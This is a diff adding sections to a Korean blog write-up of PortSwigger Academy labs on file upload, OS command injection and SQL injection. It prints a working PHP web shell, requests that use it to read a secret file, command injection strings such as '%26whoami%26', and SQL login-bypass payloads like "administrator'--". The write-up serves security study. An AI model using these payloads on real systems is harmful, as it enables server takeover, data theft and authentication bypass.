@@ -1,5 +1,5 @@
 ---
-title: '[PortSwigger] Server-side vulnerabilities'
+title: '[PortSwigger] Academy: Server-side vulnerabilities'
 date: 2024-03-19 00:00:00
 categories: [Study, PortSwigger]
 tags: [webhacking, portswigger]
@@ -476,3 +476,337 @@ stockApi=http://192.168.0.68/admin
 <br>
 
 # #File upload vulnerabilites
+
+파일 업로드 취약점은 웹 서버가 사용자에게 파일의 이름, 타입, 내용, 사이즈와 같은 것들을 충분히 검증하지 않은 채로 파일 시스템에 업로드할 수 있도록 허용 해주는 경우를 이야기한다. 이에 대한 제한을 적절하게 적용하지 못하면 기본 이미지 업로드 기능조차도 대신 임의적이고 잠재적으로 위험한 파일을 업로드하는 데 사용될 수 있다. 이는 원격 코드 실행을 가능하게 하는 서버 사이드 스크립트를 포함할 수도 있다. 어떤 경우에는 파일을 업로드하는 행위 자체만으로 피해를 입힐 수 있다. 또다른 공격으로는 파일에 대한 후속 HTTP 요청이 포함될 수 있으며 일반적으로 서버에서 파일 실행을 트리거한다.
+
+<br>
+
+## How do file upload vulnerabilities arise?
+
+매우 명백한 위험을 감안할 때, 실제 웹 사이트에서 사용자가 업로드할 수 있는 파일에 대해 어떠한 제한도 두지 않는 경우는 거의 없다. 보다 일반적으로 개발자는 본질적으로 결함이 있거나 쉽게 우회할 수 있는 강력한 검증이라고 생각하는 것을 구현한다. 예를 들어, 위험한 파일 타입을 블랙리스트에 두는 시도를 할 수 있지만 파일 확장자를 확인할 때 구문 분석 불일치를 고려하지 못한다. 모든 블랙리스트와 마찬가지로 여전히 위험할 수 있는 더  모호한 파일 형식을 실수로 생략하기도 쉽다.
+
+<br>
+
+## Exploiting unrestricted file uploads to deploy a web shell
+
+보안 관점에서, 최악의 시나리오는 웹 사이트가 PHP, Java, Python 파일과 같은 서버 사이드 스크립트를 업로드하도록 허용하는 것이고, 그 코드들을 실행하도록 구성되어 있는 것이다. 이는 서버에서 자신만의 웹 쉘을 만드는 것이 쉽도록 한다.
+
+> **웹 쉘(Web shell)**은 공격자가 쉽게 HTTP 요청을 올바른 엔드포인트에 전송함으로써 원격 웹 서버에서 임의의 명령을 실행하도록 하는 악의적인 코드이다.
+{: .prompt-tip }
+
+<br>
+
+만약 성공적으로 웹 쉘을 업로드하는 것을 할 수 있다면, 서버에 대한 모든 제어권을 갖게 된다. 이는 임의의 파일을 읽거나 작성하고, 민감한 데이터를 유출하고, 심지어 서버를 사용하여 내부 인프라와 네트워크 외부의 서버 모두에 대한 공격을 전환할 수도 있다.
+
+<br>
+
+`<?php echo file_get_contents('/path/to/target/file'); ?>`
+
+예를 들어 위와 같은 한 줄의 PHP 코드가 파일 시스템으로부터 임의의 파일을 읽도록 사용될 수 있다.
+
+<br>
+
+`<?php echo system($_GET['command']); ?>`
+
+보다 많은 기능을 수행할 수 있는 웹 쉘은 위와 같다. 이 스크립트는 다음의 요청을 통해 시스템 명령어를 전달할 수 있다.
+
+<br>
+
+`GET /example/exploit.php?command=id HTTP/1.1`
+
+<br>
+
+## 🚩Lab: Remote code execution via web shell upload
+
+![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/5167ba17-e54d-4b9e-858f-a1bb1b37b079)
+
+주어진 계정 `wiener:peter`로 로그인하여 계정 페이지로 이동하면 아바타 사진을 업로드할 수 있는 기능이 존재한다. 우선 위와 같이 임의의 사진 하나를 업로드 해보자.
+
+<br>
+
+![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/b6d3db2e-cc53-478b-a396-24510cf91bf6)
+
+이제 이미지가 업로드된 위치를 확인하기 위해 페이지의 소스코드에서 이미지를 어떤 경로에서 불러오는지를 확인해보자. 그럼 `/files/avatars/snoopy.png` 경로에서 이미지를 가져오는 것을 확인할 수 있다.
+
+<br>
+
+```php
+// webshell.php
+<?php echo system($_GET['command']); ?>
+```
+
+이제 해당 웹 사이트는 업로드 파일에 대한 검사를 진행하지 않기 때문에 웹 쉘 파일을 하나 제작하여 똑같이 업로드한다. 성공적으로 파일이 업로드되는 것을 확인할 수 있다.
+
+<br>
+
+`GET /files/avatars/webshell.php?command=ls HTTP/2`
+
+이제 파일이 저장되는 해당 경로에 `command` 파라미터를 포함하여 시스템 명령어 `ls`를 실행하도록 요청하자.
+
+<br>
+
+![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/fd887d0b-90f3-466c-931a-beca31713464)
+
+응답으로 `ls` 명령어에 대한 결과 값을 받을 수 있다.
+
+<br>
+
+`GET /files/avatars/webshell.php?command=cat+/home/carlos/secret HTTP/2`
+
+이제 문제에서 설명하는 것처럼 `/home/carlos/secret` 파일을 읽기 위해 `cat` 명령어를 이용하여 파라미터를 구성하자. 이때 명령어가 공백으로 구분되기 때문에 URL에서 공백을 의미하는 `+` 문자를 추가해주었다.
+
+이제 응답으로 파일 내용을 받을 수 있고 해당 문자열을 제출하면 문제를 해결할 수 있다.
+
+<br>
+
+## Exploiting flawed validation of file uploads
+
+실제 환경에서 우리가 이전 lab에서 본 것처럼 파일 업로드 공격에 대한 어떠한 보호 기법도 적용되지 않은 웹 사이트를 찾기는 어렵다. 그러나 보호 기법이 있다고 해서 그것이 강하다는 것을 의미하지는 않는다. 때로는 원격 코드 실행을 위한 웹 쉘을 얻기 위한 이러한 메커니즘의 결함을 악용할 수 있다.
+
+<br>
+
+## Flawed file type validation
+
+브라우저가 HTML form을 제출할 때, 일반적으로 `application/x-www-form-url-encoded` content type과 함께 `POST` 요청하여 데이터를 전송한다. 이는 이름이나 주소와 같은 간단한 텍스트를 전달하기에 좋다. 그러나 이미지 파일이나 PDF 문서와 같은 많은 양의 바이너리 데이터를 보내기에는 적합하지 않는다. 이러한 경우에는 `multipart/form-data` content type을 선호한다.
+
+<br>
+
+```
+POST /images HTTP/1.1
+    Host: normal-website.com
+    Content-Length: 12345
+    Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456
+
+    ---------------------------012345678901234567890123456
+    Content-Disposition: form-data; name="image"; filename="example.jpg"
+    Content-Type: image/jpeg
+
+    [...binary content of example.jpg...]
+
+    ---------------------------012345678901234567890123456
+    Content-Disposition: form-data; name="description"
+
+    This is an interesting description of my image.
+
+    ---------------------------012345678901234567890123456
+    Content-Disposition: form-data; name="username"
+
+    wiener
+    ---------------------------012345678901234567890123456--
+```
+
+이미지 업로드, 설명 입력, 이름 입력하는 필드를 포함하는 form에 대해 생각해보자. 위와 같은 요청을 제출할 것이다. 여기서 볼 수 있듯이, 메시지의 body는 form의 입력에 대해 각각 부분이 나누어져 있다. 각 부분은 `Content-Disposition` 헤더를 포함하고 있는데, 이는 입력 필드와 관련된 기본 정보를 제공한다. 이러한 개별적인 부분은 각자의 `Content-Type` 헤더를 포함할 수도 있는데, 이는 서버에게 이 입력을 사용하여 제출된 데이터의 MIME 유형을 알려준다.
+
+<br>
+
+웹 사이트가 파일 업로드에 대해 검증하는 방식은 특정한 `Content-Type` 헤더를 예측할 수 있는 MIME 타입과 매칭되는지를 확인하는 것이다. 예를 들어 서버가 이미지 파일만을 예측하는 경우에는 `image/jpeg`와 `image/png`와 같은 타입만을 허용할 것이다. 문제는 헤더의 값이 서버에 의해 암묵적으로 신뢰하고 있을 때 발생한다. 파일 내용이 실제로 예상되는 MIME 타입과 일치하는지 확인하기 위해 추가적인 검증이 수행되지 않는 경우에 이러한 보호 기법은 *Burp Repeater*와 같은 툴을 사용하여 쉽게 우회될 수 있다.
+
+<br>
+
+## 🚩Lab: Web shell upload via Content-Type restriction bypass
+
+![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/03557868-1349-4537-a530-4fdb1487993a)
+
+이전 lab과 같이 PHP 웹 쉘을 제작하여 아바타 이미지로 업로드를 시도하여 보면 위와 같이 `application/octet-stream` 파일 유형은 허용되지 않고 `image/jpeg`나 `image/png` 유형만 허락된다는 문구를 확인할 수 있다.
+
+<br>
+
+![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/9e487844-8e4b-479a-a50e-5870e235043b)
+
+*Burp Suite*에서 방금 요청한 패킷을 살펴보면 `Content-Type`이 `application/octet-stream`으로 설정되어 요청이 전송된 것을 확인할 수 있다. 해당 패킷을 **Repeater** 기능으로 보내어 파일 유형을 `image/jpeg`으로 바꾸어 요청을 전송하여 보자.
+
+<br>
+
+이제 `GET /files/avatars/webshell.php?command=ls HTTP/2` 요청에 대한 응답을 통해 정상적으로 웹 쉘이 작동하는지를 확인해보면 성공적으로 웹 쉘이 업로드 된 것을 확인할 수 있다.
+
+<br>
+
+`GET /files/avatars/webshell.php?command=cat+/home/carlos/secret HTTP/2`
+
+이제 문제에서 주어진 파일의 내용을 `cat` 명령어를 통해 조회하면 문제를 해결할 수 있다.
+
+<br>
+
+<br>
+
+# #OS command injection
+
+OS command injection은 shell injection으로 알려져 있다. 이는 공격자가 OS 명령어를 어플리케이션이 작동 중인 서버에서 실행하고 어플리케이션과 데이터까지 손상시키도록 허용한다. 종종 공격자는 OS command injection을 활용하여 호스팅 중인 인프라의 다른 부분을 손상 시키고 신뢰 관계를 악용하여 공격을 조직 내의 다른 시스템으로 전환할 수 있다.
+
+<br>
+
+OS command injection 취약점이 존재하는 것을 확인한 후에, 시스템에 대한 정보를 얻을 수 있는 몇몇의 초기 명령어는 유용하다. 아래의 표는 Linux와 Windows 플랫폼에서 유용한 명령어들이다.
+
+|**Purpose of command**|**Linux**|**Windows**|
+|--|--|--|
+|Name of current user|`whoami`|`whoami`|
+|Operating system|`uname -a`|`ver`|
+|Network configuration|`ifconfig`|`ipconfig /all`|
+|Network connections|`netstat -an`|`netstat -an`|
+|Running processes|`ps -ef`|`tasklist`|
+
+<br>
+
+## Injecting OS commands
+
+`https://insecure-website.com/stockStatus?productID=381&storeID=29`
+
+이번 예시는 사용자가 특정 매장에 상품에 대한 재고가 존재하는지를 조회할 수 있는 쇼핑 어플리케이션이다. 위의 URL을 통해 정보에 대해 액세스할 수 있다.
+
+<br>
+
+`stockreport.pl 381 29`
+
+재고 정보를 제공하기 위해서는 어플리케이션은 다양한 레거시 시스템을 쿼리해야 한다. 보통 이 기능은 제품 및 매장 ID를 위와 같은 인수로 사용하여 쉘 명령을 호출하여 구현한다.
+
+<br>
+
+`& echo aiwefwlguh &`
+
+이 어플리케이션은 OS command injection에 대한 보호 기법이 구현되어 있지 않기에 공격자는 위와 같은 임의의 명령을 실행하기 위한 입력 값을 제출할 수 있다.
+
+<br>
+
+`stockreport.pl & echo aiwefwlguh & 29`
+
+이 입력이 `productId` 매개변수로 제출되면 어플리케이션은 위와 같은 명령어를 실행할 것이다. `echo` 명령어를 사용하면 제공된 문자열을 출력할 수 있다. 이는 OS command injection에서 테스트하기에 유용한 방법이다. `&` 문자는 쉘 명령 구분자이다.
+
+<br>
+
+```
+Error - productID was not provided
+aiwefwlguh
+29: command not found
+```
+
+이 예시에서 3개의 개별 명령이 차례로 실행된다. 사용자에게 보여지는 결과 값은 위와 같다.
+
+- `stockreport.pl` 명령은 인자 없이 실행되기에 에러 메시지를 출력한다.
+- 삽입된 `echo` 명령어는 실행되고 전달된 문자열이 결과로 출력된다.
+- 원래의 `29` 인자는 명령어로서 실행되고 에러를 발생한다.
+
+삽입된 명령어 뒤에 추가 명령 구분 기호 `&`를 배치하는 것이 유용한데 그 이유는 삽입된 명령을 삽입 지점 뒤에 나오는 어떤 것이든과 구분하기 때문이다. 이렇게 하면 다음에 나오는 내용으로 인해 삽입된 명령어가 실행되지 않을 가능성이 줄어든다.
+
+<br>
+
+## 🚩Lab: OS command injection, simple case
+
+상품의 재고를 조회하는 `POST /product/stock HTTP/2` 요청에서 `productId`와 `storeId`를 body 값으로 포함하는 것을 확인할 수 있다.
+
+<br>
+
+`productId=1&storeId=%26echo%20hello%26`
+
+이때 값에 `&`를 이용하여 OS 명령어를 실행하도록 위와 같이 body 값을 구성할 수 있다. 여기서 `%26`은 `&` 문자를 URL 인코딩한 값이고 `%20`은 공백 문자를 URL 인코딩한 값이다.
+
+<br>
+
+![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/b14df0d8-09a5-4ade-a297-902de2a88c09)
+
+이 body 값을 포함하여 요청을 보내면 `hello` 문자열을 포함한 응답을 받을 수 있다. 따라서 OS 명령어가 정상적으로 실행되고 그 결과 값을 반환 받을 수 있음을 알 수 있다.
+
+<br>
+
+`productId=1&storeId=%26whoami%26`
+
+이제 `whoami` 명령어를 포함하여 body 값을 구성하고 요청을 보내면 문제를 해결할 수 있다.
+
+<br>
+
+<br>
+
+# #SQL Injection
+
+SQL injection(SQLi)는 공격자가 어플리케이션이 데이터베이스에 수행하는 쿼리를 방해할 수 있게 하는 웹 보안 취약점이다. 이는 공격자가 정상적으로 조회할 수 없는 데이터를 조회하도록 해준다. 이 데이터는 다른 사용자나 어플리케이션에 접근할 수 있는 다른 데이터를 포함할 수도 있다. 많은 경우에 공격자는 데이터를 수정하고 지움으로써 어플리케이션의 내용이나 동작의 영구적인 변화를 초래할 수 있다. 몇몇의 경우에서는 공격자는 SQL 인젝션을 확대하여 기본 서버나 기타 백엔드 인프라를 손상시킬 수도 있다. 이는 denial-of-service 공격을 수행할 수 있게 만들기도 한다.
+
+<br>
+
+## How to detect SQL injection vulnerabilities
+
+- 싱글 쿼터 `'`를 입력하고 에러나 다른 변화가 있는지를 살펴본다.
+- 원래 진입전과 다른 값을 평가하고 어플리케이션 응답에서 차이점을 찾는 일부 SQL 구문을 주입한다.
+- `OR 1=1`이나 `OR 1=2`와 같은 조건문을 입력하고 어플리케이션 응답의 차이점을 확인한다.
+- SQL 쿼리에서 시간 지연을 발생시키는 페이로드를 제출하고 시간에 따른 응답 차리를 확인한다.
+- SQL 쿼리 내에서 실행될 때 네트워크 상호 작용을 발생하는 OAST 페이로드를 제출하고 상호작용을 모니터링한다.
+
+또는 *Burp Scanner*를 사용해서 대부분의 SQL 인젝션 취약점을 빠르고 안정적으로 찾을 수 있다.
+
+<br>
+
+## Retrieving hidden data
+
+`https://insecure-website.com/products?category=Gifts`
+
+카테고리에 따라 상품을 보여주는 쇼핑 어플리케이션이 있다고 가정하자. 사용자가 **Gift** 카테고리를 클릭할 때 브라우저는 위와 같은 URL을 요청할 것이다.
+
+<br>
+
+`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
+
+이는 어플리케이션이 데이터베이스에서 관련된 상품의 정보를 조회하는 SQL query를 만들도록 할 것이다.
+
+<br>
+
+`released=1` 제한은 공개되지 않은 상품을 숨기기 위해 사용된다. 그렇다면 공개되지 않은 상품은 `released=0`이라고 가정할 수 있다.
+
+<br>
+
+`https://insecure-website.com/products?category=Gifts'--`
+
+어플리케이션이 어떠한 SQL 주입 공격에 대한 보호 기법을 적용하지 않는다면 공격자가 위와 같은 공격을 수행할 수 있음을 의미한다.
+
+<br>
+
+`SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1`
+
+공격에 따라 만들어지는 SQL 쿼리는 위와 같다. `--`는 SQL에서 주석을 의미한다. 이는 잇따르는 구문은 주석으로 해석되고 이를 삭제하는 효과를 의미한다. 이 예시에서 `AND released = 1`는 더 이상 쿼리에 포함되지 않는다. 결과적으로 공개되지 않은 상품을 포함하여 모든 상품이 공개될 것이다.
+
+<br>
+
+`https://insecure-website.com/products?category=Gifts'+OR+1=1--`
+
+어플리케이션이 카테고리에 있는 모든 상품을 표시하도록 하는 위와 같은 비슷한 공격을 할 수도 있다.
+
+<br>
+
+## 🚩Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+
+`GET /filter?category=Gifts HTTP/2`
+
+카테고리를 선택할 때 위의 요청을 보내는 것을 확인할 수 있다. 이때 `category` 파라미터 값으로 해당하는 카테고리명을 전달한다.
+
+<br>
+
+`GET /filter?category=Gifts'+or+1=1+-- HTTP/2`
+
+현재 보여지는 상품들은 `released=1` 조건이 포함된 상품들이므로 공개되지 않은 상품을 포함해서 보기 위해서는 위와 같이 SQL문을 구성해야한다. `--` 문으로 인해 잇따르는 `released` 제한을 무력화시킬 수 있기에 모든 상품들이 조회되는 것이다.
+
+<br>
+
+## Subverting application logic
+
+`SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'`
+
+이번에는 사용자명과 패스워드를 로그인에 사용하는 어플리케이션을 가정해보자. 만약 사용자가 사용자명으로 `wiener`을 패스워드로 `bluecheese`를 입력했다면 어플리케이션은 위와 같은 SQL 쿼리를 수행하여 자격을 체크할 것이다.
+
+<br>
+
+만약 쿼리가 사용자의 세부사항을 반환한다면 그 로그인은 성공한 것이다. 이런 경우에서 공격자는 패스워드 없이 어떠한 유저로도 로그인 할 수 있다. SQL 주석을 의미하는 `--`를 사용하여 `WHERE`절에서 패스워드 체크 과정을 삭제할 수 있다.
+
+<br>
+
+`SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`
+
+예를 들어, 사용자명으로 `administrator'--`와 패스워드에 공백 문자를 넣고 제출하면 위와 같은 쿼리를 구성할 것이다. 이 쿼리는 `username`이 `administrator`인 사용자를 반환하고 성공적으로 공격자가 해당 사용자로 로그인 하도록 한다.
+
+<br>
+
+## 🚩Lab: SQL injection vulnerability allowing login bypass
+
+![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/d805842f-9584-47f0-b147-ec98eb59e70b)
+
+로그인 페이지에서 `username` 값으로 `administrator'--`을, `password` 값으로 임의의 문자를 넣어 로그인하면 패스워드를 체크하는 구문이 주석 처리되어 패스워드 없이 `administrator` 계정으로 로그인 할 수 있다.
+
+<br>
+
+![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/496362b9-a2d5-4bc1-8e5e-c2393a43f619)
